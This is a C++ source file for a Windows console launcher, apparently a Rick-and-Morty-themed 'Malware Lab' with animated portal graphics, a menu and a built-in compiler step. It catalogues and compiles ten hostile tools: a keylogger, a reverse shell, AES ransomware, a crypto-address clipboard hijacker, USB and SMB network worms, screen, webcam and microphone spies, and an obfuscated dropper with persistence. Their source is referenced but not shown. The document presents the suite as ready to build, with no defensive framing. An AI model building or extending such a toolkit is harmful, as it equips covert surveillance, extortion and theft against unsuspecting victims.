// language: C++17, file: src/rick_lab.cpp, target: Windows 10/11 console, MSVC/MinGW
// Rick & Morty Malware Lab - launcher anime (portail vert, ASCII art, menu, compileur integre)
#include <windows.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cmath>
#include <string>
#include <vector>

static HANDLE g_out;

struct Tool {
    const char* key;    // touche menu
    const char* file;   // source
    const char* name;
    const char* desc;
    const char* exe;
    const char* mingwlibs;
};

static const Tool g_tools[] = {
    { "1", "01_keylogger.cpp",     "MEESEEKS KEYLOGGER",    "hook WH_KEYBOARD_LL, horodatage + titre de fenetre, log cache",         "01_keylogger.exe",   "-luser32" },
    { "2", "02_reverse_shell.cpp", "PORTAL SHELL",          "reverse TCP, cmd.exe via pipes, reconnexion auto",                     "02_reverse_shell.exe","-lws2_32" },
    { "3", "03_ransomware.cpp",    "SCHWIFTYCRYPT",         "AES-256-CBC (BCrypt), .morty, mode decrypt inclus",                    "03_ransomware.exe",  "-lbcrypt" },
    { "4", "04_clipboard.cpp",     "CLIP HIJACK",           "surveille le presse-papiers, remplace les adresses crypto",            "04_clipboard.exe",   "-ladvapi32" },
    { "5", "05_usb_worm.cpp",      "PLUMBUS WORM",          "copie sur chaque cle USB, autorun.inf, attribues caches",              "05_usb_worm.exe",    "" },
    { "6", "06_lan_worm.cpp",      "CITADEL WORM",          "propagation SMB en /24, creds faibles, drop via C$",                   "06_lan_worm.exe",    "-lws2_32 -lmpr" },
    { "7", "07_screenspy.cpp",     "INTERDIM SCREENS",      "captures GDI periodiques en BMP, dossier cache",                       "07_screenspy.exe",   "-lgdi32" },
    { "8", "08_webcam.cpp",        "BLIPS & CHITZ CAM",     "snapshot webcam via VFW/avicap32, BMP periodique",                     "08_webcam.exe",      "-lavicap32" },
    { "9", "09_dropper.cpp",       "PORTAL DROPPER",        "URL XOR-obfusquee, download + exec cache + persistance",               "09_dropper.exe",     "-lurlmon -ladvapi32" },
    { "0", "10_mic_rec.cpp",       "POOPYBUTTHOLE MIC",     "waveIn 16kHz, WAV de 60s en boucle, dossier cache",                    "10_mic_rec.exe",     "-lwinmm" },
};
static const int g_ntools = 10;

// ---------- console / couleurs ----------
static void EnableVT() {
    g_out = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD m = 0; GetConsoleMode(g_out, &m);
    SetConsoleMode(g_out, m | ENABLE_VIRTUAL_TERMINAL_PROCESSING);
}
static void HideCursor() { printf("\x1b[?25l"); }
static void ShowCursor() { printf("\x1b[?25h"); }

static void Col(int r, int g, int b) { printf("\x1b[38;2;%d;%d;%dm", r, g, b); }
static void Bg(int r, int g, int b)  { printf("\x1b[48;2;%d;%d;%dm", r, g, b); }
static void Reset() { printf("\x1b[0m"); }

// ---------- animations ----------
static void Portal(int frames, bool opening) {
    // rings concentriques vert portail, particules qui tournent
    const char ringch[] = "@%#*+=-:. ";
    for (int f = 0; f < frames; f++) {
        printf("\x1b[H\x1b[2J");
        double t = opening ? (double)f / frames : 1.0 - (double)f / frames;
        int maxR = (int)(t * 16);
        for (int y = 0; y < 26; y++) {
            for (int x = 0; x < 82; x++) {
                double dx = x - 41, dy = (y - 13) * 2.2;
                double r  = sqrt(dx * dx + dy * dy);
                double ang = atan2(dy, dx) * 57.29 + f * 25;
                if (r < maxR) {
                    int band = (int)r % 8;
                    Col(0, 120 + (int)(135 * (1.0 - r / (maxR + 1))), 40 + band * 6);
                    double swirl = sin((ang) * 3.14159 / 180);
                    char c = ringch[band % 9];
                    if (swirl > 0.92) c = '@';
                    if (r < 2) { Col(0, 255, 90); c = 'O'; }
                    putchar(c);
                } else putchar(' ');
            }
            putchar('\n');
        }
        // Rick & Morty de chaque cote du portail
        Col(180, 255, 190); printf("\x1b[8;4H rick"); 
        Col(120, 200, 255); printf("\x1b[8;72H morty");
        Reset();
        Sleep(45);
    }
}

static void GlitchTitle(const char* txt, int reps) {
    for (int i = 0; i < reps; i++) {
        printf("\x1b[s");
        int r = 0, g = 220, b = 40;
        if (i % 3 == 0) { r = 20; g = 255; b = 80; }
        if (i % 7 == 0) { r = 255; g = 60; b = 200; } // glitch rose portal
        Col(r, g, b);
        printf("%s", txt);
        Reset();
        printf("\x1b[u");
        Sleep(60);
    }
}

static void BeepTheme() {
    // petit riff "schwifty" sur Beep()
    Beep(330, 120); Beep(392, 120); Beep(440, 120); Beep(392, 120);
    Beep(330, 120); Beep(294, 200); Beep(262, 300);
}

static const char* kRick =
"      ___        \n"
"   .-'   `'-.    \n"
"  /  .-'''-. |   \n"
" |  | ,_  | |    \n"
" |   \\_/  /      \n"
"  '-.___.-'      \n";

static const char* kMorty =
"    .-\"\"\"\"\"-.       \n"
"   /  O O  \\      \n"
"  |   \\_/   |     \n"
"   \\  ---  /      \n"
"    '-...-'       \n";

static void DrawMenu() {
    printf("\x1b[H\x1b[2J");
    // portail statique reduit en haut
    Col(0, 255, 90);
    printf("             .-@@@@@-.             \n");
    Col(0, 220, 70);
    printf("          .-@@@@@@@@@@@-.          \n");
    Col(0, 180, 60);
    printf("         @@@@@@@@O@@@@@@@         \n");
    // titre glitch
    printf("\n");
    Col(0, 255, 120);
    printf("   R I C K   &   M O R T Y   M A L W A R E   L A B   -   C - 1 3 7   \n\n");
    // box menu
    Col(0, 200, 80);
    printf("  +--------------------------------------------------------------+\n");
    for (int i = 0; i < g_ntools; i++) {
        Col(0, 255, 120);
        printf("  | [%s] ", g_tools[i].key);
        Col(160, 255, 180);
        printf("%-20s", g_tools[i].name);
        Col(90, 180, 110);
        printf("| %-28s |\n", g_tools[i].desc);
        Col(0, 200, 80);
        printf("  +--------------------------------------------------------------+\n");
    }
    Col(0, 255, 150);
    printf("  [c] compile TOUT   [b] theme sonore   [p] replay portail   [q] quit\n");
    Col(120, 200, 255);
    printf("        wubba lubba dub dub - pick a tool, morty\n");
    Reset();
}

// ---------- compilation integree ----------
static bool FindCompiler(std::string& cmd) {
    // cl.exe (VS) puis g++ (MinGW)
    FILE* p = _popen("where cl.exe 2>nul", "r");
    char buf[512] = {0};
    if (p && fgets(buf, sizeof(buf), p)) {
        _pclose(p);
        // cl requiert l'env VS: tenter via vsdevcmd si present sinon utiliser tel quel
        cmd = "cl /nologo /O2 /EHsc /std:c++17";
        return true;
    }
    if (p) _pclose(p);
    p = _popen("where g++.exe 2>nul", "r");
    if (p && fgets(buf, sizeof(buf), p)) { _pclose(p); cmd = "g++ -O2 -std=c++17"; return true; }
    if (p) _pclose(p);
    return false;
}

static void CompileAll() {
    std::string cc;
    if (!FindCompiler(cc)) {
        Col(255, 80, 80);
        printf("\n [!] aucun compilateur (cl.exe / g++.exe) dans le PATH, morty\n");
        Reset(); Sleep(1800); return;
    }
    bool mingw = cc.find("g++") != std::string::npos;
    CreateDirectoryA("build", NULL);
    for (int i = 0; i < g_ntools; i++) {
        std::string src = std::string("src\\tools\\") + g_tools[i].file;
        std::string out = std::string("build\\") + g_tools[i].exe;
        std::string cmd = cc + " " + src + " -o " + out;
        if (mingw && g_tools[i].mingwlibs[0]) cmd += " " + std::string(g_tools[i].mingwlibs);
        Col(0, 255, 120);
        printf("\n [*] portal-build %s ...\n", g_tools[i].name);
        Reset();
        int rc = system(cmd.c_str());
        if (rc == 0) { Col(0, 255, 90);  printf(" [OK] -> %s\n", out.c_str()); }
        else         { Col(255, 70, 70); printf(" [X] echec code %d\n", rc); }
        Reset();
    }
    Col(0, 255, 150);
    printf("\n [+] tout est schwifty. binaire dans build\\\n");
    Reset(); Sleep(1200);
}

// ---------- carte d'un tool ----------
static void ToolCard(int i) {
    printf("\x1b[H\x1b[2J");
    Portal(22, true);
    Col(0, 255, 120);
    printf("\n\n ==============================================================\n");
    printf("   TOOL %d : %s\n", (i + 1) % 10, g_tools[i].name);
    Col(120, 220, 160);
    printf("   %s\n", g_tools[i].desc);
    Col(90, 170, 110);
    printf("   source : src\\tools\\%s\n", g_tools[i].file);
    printf("   detail complet : README.md (section tool %d)\n", (i + 1) % 10);
    Col(0, 255, 120);
    printf(" ==============================================================\n");
    Col(200, 255, 200);
    printf("   [c] compiler ce tool   [a] compiler TOUT   [m] menu\n");
    Reset();
    char c = (char)getchar(); getchar();
    if (c == 'c') {
        std::string cc;
        if (FindCompiler(cc)) {
            bool mingw = cc.find("g++") != std::string::npos;
            CreateDirectoryA("build", NULL);
            std::string cmd = cc + " src\\tools\\" + g_tools[i].file + " -o build\\" + g_tools[i].exe;
            if (mingw && g_tools[i].mingwlibs[0]) cmd += " " + std::string(g_tools[i].mingwlibs);
            int rc = system(cmd.c_str());
            Col(rc == 0 ? 0 : 255, rc == 0 ? 255 : 70, rc == 0 ? 90 : 70);
            printf("\n %s\n", rc == 0 ? " [OK] build fini" : " [X] echec");
            Reset(); Sleep(1500);
        }
    } else if (c == 'a') {
        CompileAll();
    }
}

int main() {
    EnableVT();
    HideCursor();
    // boot : portail s'ouvre + titre glitch
    Portal(46, true);
    printf("\x1b[H\x1b[2J");
    GlitchTitle("RICK & MORTY MALWARE LAB - C-137", 14);

    char c = 0;
    while (c != 'q') {
        DrawMenu();
        c = (char)getchar(); if (c == '\n' || c == '\r') c = (char)getchar();
        if (c >= '0' && c <= '9') {
            // keys 1..9 puis 0 pour le 10e
            int idx = (c == '0') ? 9 : (c - '1');
            if (idx >= 0 && idx < g_ntools) ToolCard(idx);
        } else if (c == 'c') CompileAll();
        else if (c == 'b') BeepTheme();
        else if (c == 'p') { Portal(46, true); Portal(20, false); Portal(46, true); }
    }
    // sortie : portail qui se referme
    Portal(30, false);
    printf("\x1b[H\x1b[2J");
    Col(0, 255, 120);
    printf("\n  wubba lubba dub dub.\n\n");
    Reset();
    ShowCursor();
    return 0;
}
